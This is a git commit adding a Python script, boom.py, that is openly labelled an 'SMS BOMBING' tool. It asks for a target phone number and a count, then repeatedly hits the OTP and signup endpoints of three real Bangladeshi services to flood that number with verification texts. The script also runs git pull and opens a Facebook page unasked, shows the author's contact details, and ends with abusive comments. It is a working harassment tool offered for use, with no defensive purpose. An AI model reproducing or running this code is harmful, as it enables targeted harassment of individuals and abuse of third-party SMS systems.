1c68846a88f6fb464ed05cb74df24109866dcabf
D3VI R9JPOOT <devixaayat@gmail.com>
2024-10-07 22:51:28 +0500

    Add files via upload

---
+++ boom.py
@@ -0,0 +1,131 @@
+import os
+print("\033[1;92m [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]]  CYBER (ROBOT) SYSTEM INSTALL. . . . \033[1;30m")
+os.system("pkg install espeak")
+print("\033[1;92m   [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] ROBOT INSTALL COMPLETE \033[1;30m")
+os.system('espeak -a 300 "Robot install complete"')
+print("\033[1;92m   [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] UPDATE CHECKING BOSS CYBER KING NIROB\033[1;30m")
+os.system('espeak -a 300 "WAITING FOR UPDATE DEVI X ROMI PAKISTANI KING "')
+os.system("git pull")
+import os,requests,time
+time.sleep(1)
+os.system("clear")
+os.system("xdg-open https://www.facebook.com/profile.php?id=61550816220930")
+logo3=("""
+                
+  _____                 _  __   __    _____             _  
+ |  __ \               (_) \ \ / /   |  __ \           (_) 
+ | |__) |___  _ __ ___  _   \ V /    | |  | | _____   ___  
+ |  _  // _ \| '_ ` _ \| |   > <     | |  | |/ _ \ \ / / | 
+ | | \ \ (_) | | | | | | |  / . \ _  | |__| |  __/\ V /| | 
+ |_|  \_\___/|_| |_| |_|_| /_/ \_(_) |_____/ \___| \_/ |_| 
+                                                           
+                                                           
+                                                           
+\x1b[38;5;196m╔═════════════╗  \033[38;5;46m🦋⃟DEVI✮⃝ ROMI𝄟⃝  \x1b[38;5;196m╔══════════════════╗
+\x1b[38;5;196m║\033[38;5;46m[🔵]\033[38;5;46m𝐀𝐔𝐓𝐇𝐎𝐑   \x1b[38;5;196m║  \033[38;5;46m🦋⃟✮⃝ ROMI𝄟⃝  \x1b[38;5;196m║\033[38;5;46mDevi             \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[D]\033[38;5;46m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊  \x1b[38;5;196m║  \033[38;5;46m🦋⃟DEVI✮⃝ ROMI𝄟⃝  \x1b[38;5;196m║\033[38;5;46Hello Devi,s 0.2      \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[E]\033[38;5;46m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \x1b[38;5;196m║  \033[38;5;46m🦋⃟ROMI✮⃝ DEVI𝄟⃝  \x1b[38;5;196m║\033[38;5;46m03263342276     \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[V]\033[38;5;46m𝐆𝐈𝐓𝐇𝐔𝐁    \x1b[38;5;196m║  \033[38;5;46m🦋⃟ROMI✮⃝ DEVI𝄟⃝  \x1b[38;5;196m║\033[38;5;46mRomi \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[I]\033[38;5;46m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌  \x1b[38;5;196m║  \033[38;5;46m🦋⃟DEVI✮⃝ ROMI𝄟⃝  \x1b[38;5;196m║\033[38;5;46mDevixayyat     \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[K]\033[38;5;46mMESSENGER       \x1b[38;5;196m║  \033[38;5;46m🦋⃟ROMI✮⃝ DEVI𝄟⃝  \x1b[38;5;196m║\033[38;5;46Hello romi,s 0.2m Command      \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[🔵]\033[38;5;46m𝐅𝐑𝐎𝐌     \x1b[38;5;196m║  \033[38;5;46m🦋⃟DEVI✮⃝ ROMI𝄟⃝ \x1b[38;5;196m ║\033[38;5;46mPAKISTAN       \x1b[38;5;196m ║
+\x1b[38;5;196m╚═════════════╝  \033[38;5;46m🦋⃟DEVI✮⃝ ROMI𝄟⃝  \x1b[38;5;196m╚══════════════════╝\033[00m\033[1;30m""")
+os.system('espeak -a 300 "author romi "')
+os.system('espeak -a 300 "Facebook  R O M I "')
+os.system('espeak -a 300 "whathapp  0 3 2 6 3 3 4 2 2 7 6 "')
+os.system('espeak -a 300 "github devixayyat "')
+os.system('espeak -a 300 "telegram   0 3 2 6 3 3 4 2 2 7 6"')
+os.system('espeak -a 300 "imo 0 3 2 6 3 3 4 2 2 7 6"')
+os.system('espeak -a 300 "from Pakistan "')
+print(logo3)
+num=input("""  \033[38;5;46mTARGET NUMBER : +880""")
+amount=int(input("\n  \033[38;5;46mSMS AMOUNT : "))
+headers1={
+			  "authority":"www.bioscopelive.com",
+			  "method":"GET",
+			  "scheme":"https",
+			  "accept":"*/*",
+			  "accept-encoding":"gzip, deflate, br",
+			  "accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
+			  "if-none-match":'W/"5baf0d010507bc980255f9941283860a"',
+			  "referer":"https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",
+			  "save-data":"on",
+			  "sec-ch-ua":'"Chromium";v="107", "Not=A?Brand";v="24"',
+			  "sec-ch-ua-mobile":"?1",
+			  "sec-ch-ua-platform":'Android',
+			  "sec-fetch-dest":"empty",
+			  "sec-fetch-mode":"cors",
+			  "sec-fetch-site":"same-origin",
+			  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
+			  "x-requested-with":"XMLHttpRequest"
+}
+url1="https://www.bioscopelive.com/en/login/send-otp?phone=880"+num+"&operator=bd-otp"
+headers2={
+         "referer":"https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options",
+         "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
+}
+url2="https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+num
+data={
+  "name": num,
+  "phoneNumber": num,
+  "service": "redx"
+}
+headers3={
+  "referer":"https://redx.com.bd/",
+  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
+}
+ses=0
+while amount>ses:
+  sent1=requests.get(url1,headers=headers1)
+  if sent1.status_code==200:
+    ses+=1
+    print(f"\n{ses}  \033[38;5;46m🦋⃟ROMI✮⃝ DEVI𝄟⃝  SMS WAS SENT🐼")
+  else:
+    pass
+  
+  sent2=requests.get(url2,headers=headers2)
+  if sent2.status_code==200:
+    ses+=1
+    print(f"\n{ses} \033[38;5;46m🦋⃟ROMI✮⃝ DEVI𝄟⃝  SMS WAS SENT🐼")
+  else:
+    pass
+  
+  send3=requests.post("https://api.redx.com.bd/v1/user/signup",headers=headers3,data=data)
+  if send3.status_code==200:
+    ses+=1
+    print(f"\n{ses} \033[38;5;46m🦋⃟ROMI✮⃝ DEVI𝄟⃝  SMS WAS SENT🐼")
+    
+  else:
+    pass
+os.system("clear")
+print(""" \033[1;32m
+\x1b[38;5;196m SEN🐼        
+ 
+  _____                 _  __   __    _____             _  
+ |  __ \               (_) \ \ / /   |  __ \           (_) 
+ | |__) |___  _ __ ___  _   \ V /    | |  | | _____   ___  
+ |  _  // _ \| '_ ` _ \| |   > <     | |  | |/ _ \ \ / / | 
+ | | \ \ (_) | | | | | | |  / . \ _  | |__| |  __/\ V /| | 
+ |_|  \_\___/|_| |_| |_|_| /_/ \_(_) |_____/ \___| \_/ |_| 
+                                                           
+                                                           
+                                                           
+\x1b[38;5;196m╔═════════════╗  \033[38;5;46m🦋⃟NIROB✮⃝ DEVI𝄟⃝  \x1b[38;5;196m╔══════════════════╗
+\x1b[38;5;196m║\033[38;5;46m[🔵]\033[38;5;46m𝐀𝐔𝐓𝐇𝐎𝐑   \x1b[38;5;196m║  \033[38;5;46m🦋⃟D3VII✮⃝ ROMII𝄟⃝  \x1b[38;5;196m║\033[38;5;46mROMI X DEVI             \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[N]\033[38;5;46m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊  \x1b[38;5;196m║  \033[38;5;46m🦋⃟ROMI✮⃝ DEVI𝄟⃝  \x1b[38;5;196m║\033[38;5;46mDevi x Romi Army      \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[I]\033[38;5;46m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \x1b[38;5;196m║  \033[38;5;46m🦋⃟ROMI✮⃝ DEVI𝄟⃝  \x1b[38;5;196m║\033[38;5;46m03263342276    \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[𝙍]\033[38;5;46m𝐆𝐈𝐓𝐇𝐔𝐁    \x1b[38;5;196m║  \033[38;5;46m🦋⃟ROMI✮⃝ DEVI𝄟⃝  \x1b[38;5;196m║\033[38;5;46mdevixayyat \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[O]\033[38;5;46m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌  \x1b[38;5;196m║  \033[38;5;46m🦋⃟DEVI✮⃝ ROMI𝄟⃝  \x1b[38;5;196m║\033[38;5;46mdevixayyat127     \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[B]\033[38;5;46mTOLL       \x1b[38;5;196m║  \033[38;5;46m🦋⃟ROMI✮⃝ D3VI𝄟⃝  \x1b[38;5;196m║\033[38;5;46mSMS BOMBING     \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[🔵]\033[38;5;46m𝐅𝐑𝐎𝐌     \x1b[38;5;196m║  \033[38;5;46m🦋⃟DEVI✮⃝ ROMI𝄟⃝ \x1b[38;5;196m ║\033[38;5;46mPakistan        \x1b[38;5;196m║
+\x1b[38;5;196m╚═════════════╝  \033[38;5;46m🦋⃟NIROB✮⃝ DEVI𝄟⃝  \x1b[38;5;196m╚══════════════════╝
+      \033[38;5;46m____  ____  _  ________
+     \033[38;5;46m/ __ \/ __ \/ | / / ____/
+    \033[38;5;46m/ / / / / / /  |/ / __/   
+   \033[38;5;46m/ /_/ / /_/ / /|  / /___   
+  \033[38;5;46m/_____/\____/_/ |_/_____/   
+                            
+ TNQ FOR USING OUR TOOLS 🖤
+""")
+#madarcod ase geli script curi korte 🙂
+#bancod tk khoroc kore nijeo to sikhte paros 
